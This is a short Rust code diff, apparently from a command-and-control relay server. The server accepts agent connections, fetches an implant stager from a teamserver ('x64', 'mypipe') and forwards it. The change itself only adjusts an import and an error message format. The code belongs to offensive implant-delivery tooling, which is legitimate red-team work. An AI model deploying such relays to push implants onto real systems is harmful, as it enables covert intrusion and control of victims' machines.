@@ -1,5 +1,4 @@
 use clap::Parser;
-use covert_server::start_implant_session;
 use covert_server::CSFrame;
 use tokio::{
     net::{TcpListener, TcpStream},
@@ -37,7 +36,7 @@ async fn agent_server_task() -> Result<(), Box<dyn std::error::Error>> {
         let (stream, _) = listener.accept().await?;
         task::spawn(async move {
             if let Err(e) = handle_agent_connection(stream, &ts_addr).await {
-                println!("connection error:{}", e);
+                println!("connection error: {}", e);
             };
         });
     }
@@ -48,7 +47,7 @@ async fn handle_agent_connection(
     ts_addr: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
     let (implant, mut ts_conn) =
-        start_implant_session(ts_addr, "x64", "mypipe").await?;
+        covert_server::start_implant_session(ts_addr, "x64", "mypipe").await?;
     agent_conn.write_frame(&implant).await?;
     println!("Got stager from ts, bytes:{}", implant.len());
     loop {
